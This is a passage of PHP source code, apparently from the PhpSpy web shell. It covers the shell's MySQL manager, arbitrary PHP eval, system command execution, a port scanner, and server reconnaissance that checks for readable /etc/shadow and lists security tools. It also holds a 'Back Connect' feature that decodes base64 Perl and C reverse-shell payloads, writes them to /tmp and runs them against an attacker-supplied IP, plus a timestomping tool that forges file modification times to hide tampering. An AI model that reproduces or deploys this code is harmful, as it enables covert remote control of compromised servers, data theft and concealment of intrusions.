		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}

	formhead(array('title'=>'MYSQL Manager'));
	makehide('action','mysqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();

	//操作记录
	formhead(array('name'=>'recordlist'));
	makehide('doing');
	makehide('action','mysqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	//选定数据库
	formhead(array('name'=>'setdbname'));
	makehide('action','mysqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();

	//选定表
	formhead(array('name'=>'settable'));
	makehide('action','mysqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();	
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		//获取数据库信息
		$mysqlver = mysql_get_server_info();
		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $mysqlver > '4.1' ? 1 : 0;

		//获取数据库
		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			mysql_select_db($dbname);

			$getnumsql = '';
			$runquery = 0;
			if ($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('<form action="'.$self.'" method="POST">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('action','mysqladmin');
			p($dbform);
			p('</form>');
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					$result = q("SHOW FULL COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<h3>Structure</h3>');
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Collation</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('<td>Privileges</td>');
					p('<td>Comment</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Collation'].'&nbsp;</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('<td>'.$row['Privileges'].'&nbsp;</td>');
						p('<td>'.$row['Comment'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
					$result = q("SHOW INDEX FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<h3>Indexes</h3>');
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Keyname</td>');
					p('<td>Type</td>');
					p('<td>Unique</td>');
					p('<td>Packed</td>');
					p('<td>Seq_in_index</td>');
					p('<td>Field</td>');
					p('<td>Cardinality</td>');
					p('<td>Collation</td>');
					p('<td>Null</td>');
					p('<td>Comment</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td>'.$row['Key_name'].'</td>');
						p('<td>'.$row['Index_type'].'</td>');
						p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
						p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
						p('<td>'.$row['Seq_in_index'].'</td>');
						p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
						p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
						p('<td>'.$row['Collation'].'&nbsp;</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Comment'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif ($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if ($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('action','mysqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if ($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']]);
						} else {
							$value = '';
						}
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
						} else {							
							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
						}
					}
					if ($doing == 'insert') {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if ($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query))
							{
								case 0:
									p('<h2>Error : '.mysql_error().'</h2>');
									break;	
								case 1:
									if (strtolower(substr($query,0,13)) == 'select * from') {
										$allowedit = 1;
									}
									if ($getnumsql) {
										$tatol = mysql_num_rows(q($getnumsql));
										$multipage = multi($tatol, $pagenum, $page, $tablename);
									}
									if (!$tablename) {
										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
										$tablename = $matches[1][0];
									}

									/*********************/
									$getfield = q("SHOW COLUMNS FROM $tablename");
									$rowdb = array();
									$keyfied = ''; //主键字段
									while($row = @mysql_fetch_assoc($getfield)) {
										$rowdb[$row['Field']]['Key'] = $row['Key'];
										$rowdb[$row['Field']]['Extra'] = $row['Extra'];
										if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
											$keyfied = $row['Field'];
										}
									}
									/*********************/								
									//直接浏览表按照主键降序排列
									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
										$query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
									}

									$result = q($query);

									p($multipage);
									p('<table border="0" cellpadding="3" cellspacing="0">');
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
									}
									p('</tr>');
									
									while($mn = @mysql_fetch_assoc($result)){
										$thisbg = bg();
										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
										$where = $tmp = $b1 = '';
										//选取条件字段用
										foreach($mn as $key=>$inside){
											if ($inside) {
												//查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。
												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
													$where = $key."='".addslashes($inside)."'";
													break;
												}
												$where .= $tmp.$key."='".addslashes($inside)."'";
												$tmp = ' AND ';
											}
										}
										//读取记录用
										foreach($mn as $key=>$inside){
											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
										}
										$where = base64_encode($where);

										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');

										p($b1);
										p('</tr>');
										unset($b1);
									}
									p('<tr class="head">');
									if ($allowedit) p('<td>Action</td>');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i<$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
									}
									p('</tr>');
									tbfoot();
									p($multipage);
									break;
								case 2:
									$ar = mysql_affected_rows();
									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
									break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="POST">');
				makehide('action','mysqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center">&nbsp;</td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('<td>Operate</td>');
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$thisbg = bg();
					p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'&nbsp;</td>');
					p('<td>'.$table['Update_time'].'&nbsp;</td>');
					if ($highver) {
						p('<td>'.$table['Engine'].'</td>');
						p('<td>'.$table['Collation'].'</td>');
					}
					p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
					p('</tr>');
				}
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if ($highver) {
					p('<td>Engine</td>');
					p('<td>Collation</td>');
				}
				p('<td>Operate</td>');
				p('</tr>');
				p('<tr class='.bg().'>');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
				p('</tr>');

				p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
				makehide('doing','backupmysql');
				formfoot();
				p("</table>");
				fr($query);
			}
		}
	}
	tbfoot();
	@mysql_close();
}//end mysql

elseif ($action == 'backconnect') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');

	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
		"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
		"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
		"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
		"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
		"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

	if ($start && $yourip && $yourport && $use){
		if ($use == 'perl') {
			cf('/tmp/angel_bc',$back_connect);
			$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
		} else {
			cf('/tmp/angel_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/angel_bc.c');
			$res = execute("/tmp/angel_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}

	formhead(array('title'=>'Back Connect'));
	makehide('action','backconnect');
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
	p('Your Port:');
	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
	p('Use:');
	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
}//end

elseif ($action == 'portscan') {
	!$scanip && $scanip = '127.0.0.1';
	!$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
	formhead(array('title'=>'Port Scan'));
	makehide('action','portscan');
	p('<p>');
	p('IP:');
	makeinput(array('name'=>'scanip','size'=>20,'value'=>$scanip));
	p('Port:');
	makeinput(array('name'=>'scanport','size'=>80,'value'=>$scanport));
	makeinput(array('name'=>'startscan','value'=>'Scan','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();

	if ($startscan) {
		p('<h2>Result &raquo;</h2>');
		p('<ul class="info">');
		foreach(explode(',', $scanport) as $port) {
			$fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1); 
			if (!$fp) {
				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
		   } else {
				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
				@fclose($fp);
		   } 
		}
		p('</ul>');
	}
}

elseif ($action == 'eval') {
	$phpcode = trim($phpcode);
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?".">$phpcode<?");
	}
	formhead(array('title'=>'Eval PHP Code'));
	makehide('action','eval');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
	formfooter();
}//end eval

elseif ($action == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
	
	goback();

}//end editfile

elseif ($action == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone folder/file was last modified time'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter folder/file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference folder/file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
	goback();
}//end newtime

elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell->ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
		formhead(array('title'=>'Execute Program'));
		makehide('action','shell');
		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
		p('</p>');
		formfoot();
	}
	formhead(array('title'=>'Execute Command'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();

	if ($command) {
		p('<hr width="100%" noshade /><pre>');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$command);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('</pre>');
	}
}//end shell

elseif ($action == 'phpenv') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	!$dis_func && $dis_func = 'No';	
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',__FILE__),

		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',$adminmail),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('memory_limit',getcfg('memory_limit')),
		20 => array('post_max_size',getcfg('post_max_size')),
		21 => array('upload_max_filesize',$upsize),
		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		23 => array('disable_functions',$dis_func),
	);

	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}

	formhead(array('title'=>'Server environment'));
	makehide('action','phpenv');
	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();

	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if ($a==0) {
			for($i=1;$i<=9;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif ($a == 1) {
			for($i=10;$i<=23;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}//end phpenv

elseif ($action == 'secinfo') {
	
	secparam('Server software', @getenv('SERVER_SOFTWARE'));
	secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
	secparam('Open base dir', @ini_get('open_basedir'));
	secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	secparam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	secparam('Supported databases', implode(', ', $temp));
	
	if( !IS_WIN ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
		secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
		secparam('OS version', @file_get_contents('/proc/version'));
		secparam('Distr name', @file_get_contents('/etc/issue.net'));
		$safe_mode = @ini_get('safe_mode');
		if(!$GLOBALS['safe_mode']) {
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			secparam('Downloaders', implode(', ',$temp));
			secparam('Hosts', @file_get_contents('/etc/hosts'));
			secparam('HDD space', execute('df -h'));
			secparam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		secparam('OS Version',execute('ver'));
		secparam('Account Settings',execute('net accounts'));
		secparam('User Accounts',execute('net user'));
		secparam('IP Configurate',execute('ipconfig -all'));
	}
}//end

else {
